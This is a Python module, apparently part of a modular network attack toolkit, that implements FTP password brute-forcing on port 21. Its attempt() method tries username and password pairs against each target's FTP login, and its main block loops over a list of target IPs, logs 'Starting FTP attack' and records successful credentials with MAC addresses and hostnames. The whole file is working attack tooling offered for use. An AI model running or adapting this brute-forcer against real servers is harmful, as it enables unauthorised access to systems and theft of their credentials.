"""
ftp_connector.py — FTP brute force (port 21).

Thin adapter over BaseConnector (#12). Only attempt() and the module-level
b_* discovery globals live here; queue/worker/run_bruteforce are shared.
"""
import logging
from ftplib import FTP
from base_connector import BaseConnector, BaseBruteforce
from logger import Logger

logger = Logger(name="ftp_connector.py", level=logging.DEBUG)

b_class = "FTPBruteforce"
b_module = "ftp_connector"
b_status = "brute_force_ftp"
b_port = 21
b_parent = None


class FTPConnector(BaseConnector):
    PORT = 21
    HEADER = "MAC Address,IP Address,Hostname,User,Password,Port\n"
    OUTFILE_ATTR = "ftpfile"
    PROGRESS_LABEL = "FTP"
    QUEUE_HAS_MAC = True

    def attempt(self, adresse_ip, user, password):
        """Login-only FTP connect with a hard connect timeout (#4). Any failure -> False."""
        try:
            conn = FTP()
            conn.connect(adresse_ip, 21, timeout=10)  # bounded: an unresponsive host must not stall the worker
            conn.login(user, password)
            conn.quit()
            logger.info(f"Access to FTP successful on {adresse_ip} with user '{user}'")
            return True
        except Exception:
            return False


class FTPBruteforce(BaseBruteforce):
    connector_class = FTPConnector
    display_name = "FTPBruteforce"


if __name__ == "__main__":
    from shared import SharedData
    shared_data = SharedData()
    try:
        ftp_bruteforce = FTPBruteforce(shared_data)
        logger.info("[bold green]Starting FTP attack...on port 21[/bold green]")
        for row in shared_data.read_data():
            ip = row["IPs"]
            ftp_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total successful attempts: {len(ftp_bruteforce.connector.results)}")
    except Exception as e:
        logger.error(f"Error: {e}")
